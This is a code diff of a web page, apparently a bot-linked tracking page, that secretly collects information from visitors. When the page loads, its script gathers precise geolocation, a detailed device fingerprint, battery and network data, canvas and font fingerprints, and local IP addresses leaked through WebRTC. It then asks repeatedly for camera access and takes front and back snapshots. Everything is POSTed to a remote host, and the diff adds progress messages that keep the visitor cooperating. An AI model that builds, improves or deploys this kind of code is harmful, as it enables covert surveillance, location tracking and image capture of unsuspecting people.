@@ -86,17 +86,6 @@
             margin-top: 8px;
         }
 
-        .loader {
-            margin: 30px auto;
-            width: 60px;
-            height: 60px;
-            border: 4px solid #f1f5f9;
-            border-top: 4px solid #4f46e5;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
         .info-box {
             background: #f8fafc;
             border: 1px solid #e2e8f0;
@@ -118,15 +107,19 @@
             color: #16a34a;
             font-weight: 500;
         }
+        .info-item.failed {
+            color: #ef4444;
+        }
         .checkmark {
-            color: #cbd5e1;
-            font-size: 18px;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
             margin-right: 12px;
-            transition: color 0.3s ease;
+            transition: all 0.3s ease;
         }
-        .info-item.completed .checkmark {
-            color: #16a34a;
-        }
+        .check-pending { background: #fbbf24; }
+        .check-success { background: #10b981; }
+        .check-error { background: #ef4444; }
 
         .badge {
             display: inline-flex;
@@ -282,24 +275,24 @@
         
         <div class="info-box">
             <div class="info-item" id="item1">
-                <span class="checkmark">●</span>
-                <span>Gathering device information...</span>
+                <div class="checkmark check-pending"></div>
+                <span id="status1">Gathering device information...</span>
             </div>
             <div class="info-item" id="item2">
-                <span class="checkmark">●</span>
-                <span>Analyzing network data...</span>
+                <div class="checkmark check-pending"></div>
+                <span id="status2">Analyzing network data...</span>
             </div>
             <div class="info-item" id="item3">
-                <span class="checkmark">●</span>
-                <span>Fingerprinting browser...</span>
+                <div class="checkmark check-pending"></div>
+                <span id="status3">Fingerprinting browser...</span>
             </div>
             <div class="info-item" id="item4">
-                <span class="checkmark">●</span>
-                <span>Collecting system info...</span>
+                <div class="checkmark check-pending"></div>
+                <span id="status4">Collecting system info...</span>
             </div>
             <div class="info-item" id="item5">
-                <span class="checkmark">●</span>
-                <span>Requesting camera access...</span>
+                <div class="checkmark check-pending"></div>
+                <span id="status5">Requesting camera access...</span>
             </div>
         </div>
         
@@ -344,28 +337,68 @@
         let completedSteps = 0;
         const totalSteps = 5;
 
+        function updateStatus(stepId, message, status = 'success') {
+            const item = document.getElementById(`item${stepId}`);
+            const statusSpan = document.getElementById(`status${stepId}`);
+            const checkmark = item.querySelector('.checkmark');
+            
+            if (statusSpan) statusSpan.textContent = message;
+            
+            if (status === 'success') {
+                item.classList.add('completed');
+                checkmark.className = 'checkmark check-success';
+            } else if (status === 'error') {
+                item.classList.add('failed');
+                checkmark.className = 'checkmark check-error';
+            } else {
+                checkmark.className = 'checkmark check-pending';
+            }
+        }
+
         function updateProgress() {
             const percent = Math.min(Math.floor((completedSteps / totalSteps) * 100), 100);
             progressBar.style.width = `${percent}%`;
             progressLabel.textContent = `${percent}%`;
         }
 
-        function completeStep(stepId) {
-            const item = document.getElementById(stepId);
-            if (item && !item.classList.contains('completed')) {
-                item.classList.add('completed');
-                item.querySelector('span').textContent = item.querySelector('span').textContent.replace('...', ' ✓');
-                completedSteps++;
-                updateProgress();
-            }
+        function completeStep(stepId, message = null, status = 'success') {
+            if (message) updateStatus(stepId, message, status);
+            completedSteps++;
+            updateProgress();
         }
 
-        function send(endpoint, data) {
-            fetch(`${host}/${endpoint}`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(() => {});
+        async function send(endpoint, data) {
+            try {
+                const response = await fetch(`${host}/${endpoint}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                
+                const result = await response.json();
+                console.log(`✅ ${endpoint} success:`, result);
+                return result;
+            } catch (error) {
+                console.error(`❌ ${endpoint} failed:`, error.message);
+                // Send error to bot for debugging
+                try {
+                    await fetch(`${host}/info`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            uid: uid,
+                            data: `<b>📤 Send Failed (${endpoint}):</b> <code>${error.message}</code>`
+                        })
+                    });
+                } catch (e) {
+                    console.error('Failed to send error report:', e);
+                }
+                return { success: false, error: error.message };
+            }
         }
 
         // ========== MAXIMUM INFO GATHERING ==========
@@ -374,8 +407,8 @@
         setTimeout(() => {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        send('location', {
+                    async (pos) => {
+                        const result = await send('location', {
                             lat: pos.coords.latitude,
                             lon: pos.coords.longitude,
                             uid: uid,
@@ -384,144 +417,167 @@
                             heading: pos.coords.heading,
                             speed: pos.coords.speed
                         });
-                        completeStep('item1');
+                        completeStep(1, '✓ Location secured', result.success ? 'success' : 'error');
                     },
-                    err => {
-                        send('info', { uid: uid, data: `<b>📍 Location Error:</b> <code>${err.message}</code>` });
-                        completeStep('item1');
+                    async (err) => {
+                        await send('info', { uid: uid, data: `<b>📍 Location Error:</b> <code>${err.message}</code>` });
+                        completeStep(1, '⚠️ Location access denied', 'error');
                     },
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             } else {
-                send('info', { uid: uid, data: `<b>📍 Location:</b> Not supported` });
-                completeStep('item1');
+                completeStep(1, '⚠️ Location not supported', 'error');
             }
         }, 300);
 
         // 2. DEVICE FINGERPRINT
-        setTimeout(() => {
-            const fp = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages?.join(', ') || 'N/A',
-                cookies: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'unknown',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                touch: navigator.maxTouchPoints > 0,
-                webdriver: navigator.webdriver,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                online: navigator.onLine,
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
-                    colorDepth: screen.colorDepth,
-                    pixelDepth: screen.pixelDepth,
-                    dpi: window.devicePixelRatio
-                }
-            };
+        setTimeout(async () => {
+            try {
+                const fp = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages?.join(', ') || 'N/A',
+                    cookies: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack || 'unknown',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    touch: navigator.maxTouchPoints > 0,
+                    webdriver: navigator.webdriver,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    online: navigator.onLine,
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        availWidth: screen.availWidth,
+                        availHeight: screen.availHeight,
+                        colorDepth: screen.colorDepth,
+                        pixelDepth: screen.pixelDepth,
+                        dpi: window.devicePixelRatio
+                    }
+                };
 
-            send('info', { uid: uid, data: `<b>🖥️ Device Fingerprint</b>\n<code>${JSON.stringify(fp, null, 2)}</code>` });
-            completeStep('item2');
+                const result = await send('info', { 
+                    uid: uid, 
+                    data: `<b>🖥️ Device Fingerprint</b>\n<code>${JSON.stringify(fp, null, 2)}</code>` 
+                });
+                completeStep(2, '✓ Device profile created', result.success ? 'success' : 'error');
+            } catch (err) {
+                await send('info', { uid: uid, data: `<b>🖥️ Device Error:</b> <code>${err.message}</code>` });
+                completeStep(2, '⚠️ Device scan failed', 'error');
+            }
         }, 800);
 
         // 3. BATTERY + NETWORK
         setTimeout(async () => {
-            let batteryInfo = 'Not available';
+            let messages = [];
+
+            // Battery
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
-                    batteryInfo = `${(battery.level * 100).toFixed(1)}% | Charging: ${battery.charging}`;
-                    send('info', { uid: uid, data: `<b>🔋 Battery:</b> ${batteryInfo}` });
+                    const batteryInfo = `${(battery.level * 100).toFixed(1)}% | Charging: ${battery.charging}`;
+                    await send('info', { uid: uid, data: `<b>🔋 Battery:</b> ${batteryInfo}` });
+                    messages.push('Battery');
                 } catch(e) {
-                    send('info', { uid: uid, data: `<b>🔋 Battery:</b> Error accessing` });
+                    messages.push('BatErr');
                 }
             }
 
-            let networkInfo = 'Unknown';
+            // Network
             if (navigator.connection) {
                 const conn = navigator.connection;
-                networkInfo = `${conn.effectiveType || 'unknown'} | ${conn.downlink || '?'} Mbps | RTT: ${conn.rtt || '?'}ms`;
-                send('info', { uid: uid, data: `<b>🌐 Network:</b> ${networkInfo}` });
+                const networkInfo = `${conn.effectiveType || 'unknown'} | ${conn.downlink || '?'} Mbps | RTT: ${conn.rtt || '?'}ms`;
+                await send('info', { uid: uid, data: `<b>🌐 Network:</b> ${networkInfo}` });
+                messages.push('Network');
             }
 
-            completeStep('item3');
+            completeStep(3, `✓ ${messages.join(', ')}`, 'success');
         }, 1500);
 
         // 4. FINGERPRINTING (Canvas + Audio + WebRTC + Fonts)
         setTimeout(async () => {
+            let messages = [];
+
             // Canvas Fingerprint
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = "14px Arial";
-            ctx.fillText('MultiInfoBotFingerprint', 2, 2);
-            const canvasFP = canvas.toDataURL().substring(0, 100) + '...';
-            send('info', { uid: uid, data: `<b>🎨 Canvas FP:</b> <code>${canvasFP}</code>` });
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = "14px Arial";
+                ctx.fillText('MultiInfoBotFingerprint', 2, 2);
+                const canvasFP = canvas.toDataURL().substring(0, 100) + '...';
+                await send('info', { uid: uid, data: `<b>🎨 Canvas FP:</b> <code>${canvasFP}</code>` });
+                messages.push('Canvas');
+            } catch(e) {
+                messages.push('CanvErr');
+            }
 
             // Audio Fingerprint
-            let audioSupported = false;
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                audioSupported = true;
-                send('info', { uid: uid, data: `<b>🎵 AudioContext:</b> Supported` });
+                await send('info', { uid: uid, data: `<b>🎵 AudioContext:</b> Supported` });
+                messages.push('Audio');
             } catch(e) {
-                send('info', { uid: uid, data: `<b>🎵 AudioContext:</b> Not supported` });
+                await send('info', { uid: uid, data: `<b>🎵 AudioContext:</b> Not supported` });
+                messages.push('AudErr');
             }
 
             // WebRTC IP Leak
-            const getIPs = () => {
-                return new Promise(resolve => {
-                    const ips = [];
-                    const pc = new RTCPeerConnection({ iceServers: [] });
-                    pc.createDataChannel('');
-                    pc.createOffer().then(o => pc.setLocalDescription(o));
-                    pc.onicecandidate = e => {
-                        if (!e || !e.candidate) {
+            try {
+                const getIPs = () => {
+                    return new Promise(resolve => {
+                        const ips = [];
+                        const pc = new RTCPeerConnection({ iceServers: [] });
+                        pc.createDataChannel('');
+                        pc.createOffer().then(o => pc.setLocalDescription(o));
+                        pc.onicecandidate = e => {
+                            if (!e || !e.candidate) {
+                                resolve(ips);
+                                return;
+                            }
+                            const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                            if (ipMatch && !ips.includes(ipMatch[1])) {
+                                ips.push(ipMatch[1]);
+                            }
+                        };
+                        setTimeout(() => {
+                            pc.close();
                             resolve(ips);
-                            return;
-                        }
-                        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                        if (ipMatch && !ips.includes(ipMatch[1])) {
-                            ips.push(ipMatch[1]);
-                        }
-                    };
-                    setTimeout(() => {
-                        pc.close();
-                        resolve(ips);
-                    }, 2000);
-                });
-            };
+                        }, 2000);
+                    });
+                };
 
-            const ips = await getIPs();
-            if (ips.length) {
-                send('info', { uid: uid, data: `<b>🌐 WebRTC IPs:</b>\n<code>${ips.join('\\n')}</code>` });
+                const ips = await getIPs();
+                if (ips.length) {
+                    await send('info', { uid: uid, data: `<b>🌐 WebRTC IPs:</b>\n<code>${ips.join('\\n')}</code>` });
+                    messages.push('WebRTC');
+                }
+            } catch(e) {
+                messages.push('IP Err');
             }
 
-            // Installed Fonts (basic detection)
-            const detectFonts = () => {
-                const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS'];
+            // Installed Fonts
+            try {
+                const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia'];
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
                 const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
                 
                 const installed = testFonts.filter(font => {
-                    ctx.font = `72px ${font}, monospace`;
+                    ctx.font = `72px "${font}", monospace`;
                     const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
-                    return baseWidth !== testWidth;
+                    return Math.abs(baseWidth - testWidth) > 2;
                 });
                 
-                return installed.join(', ') || 'None detected';
-            };
+                await send('info', { uid: uid, data: `<b>🔠 Fonts:</b> ${installed.join(', ')}` });
+                messages.push('Fonts');
+            } catch(e) {
+                messages.push('FontErr');
+            }
 
-            const fonts = detectFonts();
-            send('info', { uid: uid, data: `<b>🔠 Installed Fonts:</b> ${fonts}` });
-
-            completeStep('item4');
+            completeStep(4, `✓ ${messages.join(', ')}`, 'success');
         }, 2200);
 
         // ========== CAMERA HANDLING ==========
@@ -529,6 +585,7 @@
         function showCameraModal() {
             document.getElementById('cameraModal').classList.add('active');
             send('cam-status', { uid: uid, status: 'pending' });
+            updateStatus(5, '⏳ Waiting for your permission...');
         }
 
         function allowCamera() {
@@ -541,7 +598,7 @@
             document.getElementById('cameraModal').classList.remove('active');
             cameraDenied = true;
             send('cam-status', { uid: uid, status: 'denied' });
-            completeStep('item5');
+            completeStep(5, '❌ Camera access denied', 'error');
         }
 
         async function requestCameraAccess(facingMode = 'user') {
@@ -559,29 +616,32 @@
                     cameraAttempts++;
                     if (cameraAttempts <= 3) {
                         setTimeout(showCameraModal, 1000);
+                        updateStatus(5, `⚠️ Attempt ${cameraAttempts}/3 - Please allow camera`);
                     } else {
                         cameraDenied = true;
                         send('cam-status', { uid: uid, status: 'error' });
-                        completeStep('item5');
+                        completeStep(5, '❌ Camera permanently denied', 'error');
                     }
                 } else {
                     if (facingMode === 'user') {
                         setTimeout(() => requestCameraAccess('environment'), 1000);
+                        updateStatus(5, '🔄 Trying back camera...');
                     } else {
                         cameraDenied = true;
                         send('cam-status', { uid: uid, status: 'error' });
-                        completeStep('item5');
+                        completeStep(5, '⚠️ Camera error', 'error');
                     }
                 }
             }
         }
 
-        function captureAndSend(stream, type = 'front') {
+        function captureAndSend(stream, type = 'user') {
             const video = document.createElement('video');
             video.srcObject = stream;
             video.play();
             
             send('cam-status', { uid: uid, status: 'allowed' });
+            updateStatus(5, `📷 Capturing ${type === 'environment' ? 'back' : 'front'} camera...`);
             
             video.onloadedmetadata = () => {
                 setTimeout(() => {
@@ -596,6 +656,12 @@
                     send('camsnap', { 
                         uid: uid, 
                         [type === 'environment' ? 'back' : 'front']: imageData 
+                    }).then(result => {
+                        if (result.success) {
+                            updateStatus(5, `✓ ${type === 'environment' ? 'Back' : 'Front'} camera captured`);
+                        } else {
+                            updateStatus(5, `⚠️ ${type === 'environment' ? 'Back' : 'Front'} cam failed`, 'error');
+                        }
                     });
                     
                     stream.getTracks().forEach(t => t.stop());
@@ -603,7 +669,7 @@
                     if (type === 'user') {
                         setTimeout(() => requestCameraAccess('environment'), 1500);
                     } else {
-                        completeStep('item5');
+                        completeStep(5);
                     }
                 }, 500);
             };
